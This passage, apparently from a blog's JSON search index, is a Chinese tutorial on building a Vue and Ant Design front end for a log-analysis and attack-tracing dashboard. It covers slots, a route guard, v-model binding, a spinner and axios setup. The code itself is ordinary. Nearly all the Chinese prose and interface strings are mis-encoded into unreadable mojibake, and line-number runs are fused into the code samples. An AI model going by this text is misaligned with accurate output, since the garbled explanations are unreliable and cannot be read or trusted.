5.æ’æ§½12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; æ–‡ä»¶ä¸Šä¼  &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; æ•°æ®åˆ†æ &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; æ—¥å¿—åˆ†æ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; è·å–æŠ¥å‘Š &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;ç«‹ä½“æ•°æ®&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; æ”»å‡»æº¯æº &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; å®æ—¶ç›‘æ§ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;ç³»ç»Ÿè®¾ç½®&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;ç™»å‡º&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;æ˜¯å¦ç¡®å®šç™»å‡ºï¼Ÿ&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- ä¸Šé¢æ˜¯åœ¨å¯¼èˆªæ æœ€é¡¶ç«¯åŠ ä¸œè¥¿ --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design Â©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼š 1&lt;slot&gt;&lt;/slot&gt; åœ¨Vueå½“ä¸­ï¼Œè¿™ä¸ªç›¸å½“äºä¸€ä¸ªæ’æ§½ï¼Œä¹Ÿå°±æ˜¯ï¼Œå‘ƒï¼Œç±»ä¼¼ä¸€ä¸ªincludeå‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦æŠŠä»–å½“ä½œæ¨¡æ¿çš„è¯å°±éœ€è¦è¿™æ ·å†™ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//åœ¨ä¸‹é¢å¯¼å…¥ï¼Œä¹‹åå†htmlå½“ä¸­ä½¿ç”¨å³å¯components:&#123; menus, &#125;, 6.è·¯ç”±å®ˆå«æˆ‘ä»¬å‰ç«¯è‚¯å®šæ˜¯è¦é‰´æƒçš„å§ï¼Œä¸ç„¶ç”¨æˆ·å°±å¯å¯¹å‰ç«¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæ•…æˆ‘ä»¬æ„é€ ä¸€ä¸ªå±€éƒ¨å®ˆå«æ˜¯è¿™æ ·çš„ï¼š 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, è¿™æ ·çš„è¯ï¼Œå†è®¿é—®è¯¥è·¯ç”±ï¼Œç¦»å¼€è·¯ç”±çš„æ—¶å€™éƒ½ä¼šå…ˆè®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œæˆ‘ä»¬åç«¯å†™å¥½ä»£ç ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†çš„è¯ï¼Œå°±ä¼šè¿”å›åˆ°indexé¡µé¢äº†ã€‚ 7.æœŸå¾…å€¼è¿™ä¸ªç†è§£èµ·æ¥å•é å˜´è¯´è¾ƒä¸ºåƒµç¡¬ï¼Œéœ€è¦å®æˆ˜ä¸­ä½¿ç”¨æ‰å¯ä»¥é¢†æ‚Ÿçš„æ¸…æ¥šï¼Œæ¯”å¦‚æˆ‘ä»¬çš„htmlä»£ç ä¸­æ„é€ å¦‚ä¸‹ï¼š 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;æŠ¥å‘Šç”Ÿæˆ&lt;/a-button&gt; ï¼ˆé€šè¿‡Vueæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@clickçš„æ–¹æ³•æ¥å¤„ç†å„ç§äº‹ä»¶ï¼Œä¹‹åå¡«å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å†™å…¥å‡½æ•°çš„å®å‚ï¼Œè€Œå®å‚ä¸ä¸€å®šæ˜¯ä¸€å®šå‡ºç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®å‚å¯èƒ½ä¼šå‡ºç°ä¸ºnullçš„æƒ…å†µï¼Œè€ŒVueä¸æƒ³å‡ºç°è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥è¦æ±‚æˆ‘ä»¬å¡«å…¥é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸå¾…å€¼ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰å¡«å…¥å‚æ•°çš„æ—¶å€™è‡ªåŠ¨å¡«å…¥çš„å‚æ•° 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.è®¾ç½®é»˜è®¤å€¼æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³åœ¨ç”¨æˆ·è®¿é—®ä¹‹å‰çš„æ—¶å€™ç›´æ¥è·å–æ•°æ®ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ï¼š 123mounted() &#123; // this.drawChart(); &#125; ä»¥è¿™ç§æ–¹å¼å¡«å…¥çš„å€¼ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å­ï¼š 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.å®ç°ç›‘å¬æ•°æ®åœ¨ä¹‹å‰çš„layuiçš„æ—¶å€™ï¼Œå› ä¸ºæˆ‘ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å¾€å¾€é€ æˆè‡ªå·±è¦å†™å¾ˆå¤šçš„type=hidenï¼Œæˆ–è€…å¿…é¡»æ„é€ formè¡¨å•çš„æƒ…å†µï¼Œè€Œä½¿ç”¨æ¡†æ¶ä¹‹åå¯ä»¥é€šè¿‡v-modelæ“ä½œç®€å•çš„å®ç°è¿™ä¸ªæ•ˆæœï¼Œ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;//åœ¨JSä»£ç ä¸­ï¼šselectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘å¹¶æ²¡æœ‰å†™formè¡¨å•ï¼Œè€Œæˆ‘ä¾ç„¶å¯ä»¥å®ç°æäº¤æ•°æ®ï¼Œæ˜¯å› ä¸ºä½¿ç”¨v-modelç›‘å¬ä¹‹åï¼Œè¯¥inputè¾“å…¥æ¡†çš„å†…å®¹è¢«JSå®æ—¶ç›‘æ§ç€ã€‚ 10.ç›‘å¬çš„å¦™ç”¨åˆ©ç”¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®Œæˆå¯¹ä¸€äº›çœ‹èµ·æ¥å¾ˆé…·ç‚«çš„ç‰¹æ•ˆï¼Œæ¯”å¦‚ï¼Œå¦‚æœç”¨æˆ·æƒ³è¦æäº¤ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œå°±éœ€è¦å¡«å†™å‡ ä¸ªinputæ¡†ï¼Œå¹¶ä¸”å¦‚æœæ¡†æ˜¯ç©ºçš„ï¼Œè¿˜å¯ä»¥ç»™å‡ºæç¤ºç­‰ç­‰ï¼Œè¿™é‡Œä¸¾å‡ºä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼š 123456789101112&lt;!-- ç”¨æˆ·ååˆ¤æ–­ --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; é¡ºä¾¿ä¸€æï¼Œ ç”¨:å¼•å·å†™å…¥çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯ç”¨äºæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå»åˆ¤æ–­userNameErrorçš„çŠ¶å†µ åœ¨methodså½“ä¸­ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹ä»£ç ï¼š 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, åœ¨dataå½“ä¸­ï¼š 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, å®˜æ–¹æ˜¯å¦‚ä¸‹è§£é‡Šçš„ï¼š v-decorator æ˜¯ Ant Design çš„æ§ä»¶éªŒè¯å±æ€§ã€‚ ç»è¿‡ getFieldDecorator æˆ– v-decorator åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  valueï¼ˆæˆ– valuePropName æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ onChangeï¼ˆæˆ– trigger æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ï¼Œæ•°æ®åŒæ­¥å°†è¢« Form æ¥ç®¡ï¼Œè¿™ä¼šå¯¼è‡´ä»¥ä¸‹ç»“æœï¼š ä½ ä¸å†éœ€è¦ä¹Ÿä¸åº”è¯¥ç”¨ onChange æ¥åšåŒæ­¥ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»§ç»­ç›‘å¬ onChange ç­‰äº‹ä»¶ã€‚ ä½ ä¸èƒ½ç”¨æ§ä»¶çš„ value defaultValue ç­‰å±æ€§æ¥è®¾ç½®è¡¨å•åŸŸçš„å€¼ï¼Œé»˜è®¤å€¼å¯ä»¥ç”¨ getFieldDecorator æˆ– v-decorator é‡Œçš„ initialValueã€‚ ä½ ä¸åº”è¯¥ç”¨ v-modelï¼Œå¯ä»¥ä½¿ç”¨ this.form.setFieldsValue æ¥åŠ¨æ€æ”¹å˜è¡¨å•å€¼ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹å¼æ˜¯å§formç”±Vueå½»åº•æ‰˜ç®¡äº†~å’Œä¹‹å‰çš„ä¸åŒï¼Œä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨å€¼ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°†ä¼šè°ƒç”¨v-decoratorã€‚å½“ç„¶è¿™ç§æ–¹å¼æˆ‘æ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼ŒçœŸè¦è¯´æˆ‘æ¯”è¾ƒç†è§£çš„æ˜¯å¦å¤–ä¸€ä¸ªå½¢å¼ 11.v-modelçš„å¦™ç”¨åœ¨htmlå½“ä¸­å†™ä¸‹ï¼š 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;è¾“å…¥keyï¼Œå³å¯è‡ªåŠ¨æº¯æº&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; æ³¨æ„è¿™é‡Œçš„spinningï¼Œæˆ‘ä»¬ç»™å¥¹è¿›è¡Œæ‰˜ç®¡ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè€Œspinningçš„æœŸæœ›é»˜è®¤å€¼åœ¨dataå½“ä¸­æ„é€ ï¼š 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, è€Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®å‘é€æ•°æ®ä¹‹åï¼š 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; ä¸€æ—¦æ•°æ®æˆåŠŸå‘é€è¿‡å»ï¼Œæˆ‘ä»¬å°±å°†spinningçš„å€¼æ”¹æˆtrueï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºäº†ï¼Œå½“è·å–æ•°æ®ä¹‹åï¼Œæˆ‘ä»¬å°±æ”¹æˆfalseï¼Œè®©ä»–æ¶ˆå¤±å³å¯ axios part1.aioxå‘é€æ•°æ®axiosæ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œç”¨äºå‘é€æ•°æ®ç»™åç«¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œæˆ‘ä»¬ä¸ºäº†é™ä½ä»£ç è€¦åˆæ€§ï¼Œåº”è¯¥æŠ“é—¨å»ºç«‹ä¸€ä¸ªaxiosæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”è®¾ç½®ä¸€ä¸ªhttp.jsï¼Œå„ç§å„æ ·çš„è®¾ç½®æˆ‘ä»¬éƒ½åœ¨axioså½“ä¸­è¿›è¡Œé…ç½®å³å¯ï¼š 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true ä¾‹å¦‚è¿™æ ·ï¼Œå°±æ˜¯è®¾ç½®äº†é»˜è®¤çš„urlï¼Œè®¾ç½®è¶…æ—¶äº‹ä»¶ï¼Œå¸¦ä¸Šcookiesç­‰ç­‰ï¼Œè€Œaxiosçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ„é€ å¦‚ä¸‹ï¼š 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() åœ¨thenå’Œcatå½“ä¸­å»å†™åˆ«çš„ä¸œè¥¿ï¼Œä¸Šå›¾å½“ä¸­çš„res.dataä¸ºAPIç»™å›æ¥çš„æ•°æ®ï¼ŒæˆåŠŸä¹‹årouter.pushå°±å¯ä»¥è®©é¡µé¢è¿›è¡Œè·³è½¬äº† æ€»ç»“æ„Ÿè§‰è‡ªå·±æ˜¯è¾¹å­¦è¾¹å†™çš„ï¼Œå­¦åˆ°åé¢çš„æ—¶å€™æ„Ÿè§‰ä¹‹å‰çš„ä¸œè¥¿è¿˜å¯ä»¥åšå¾—æ›´å¥½ï¼Œä½†æ˜¯è“ç‹—äº†ï¼Œå·²ç»ä¸æƒ³åŠ¨äº†orz","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]}],"categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]}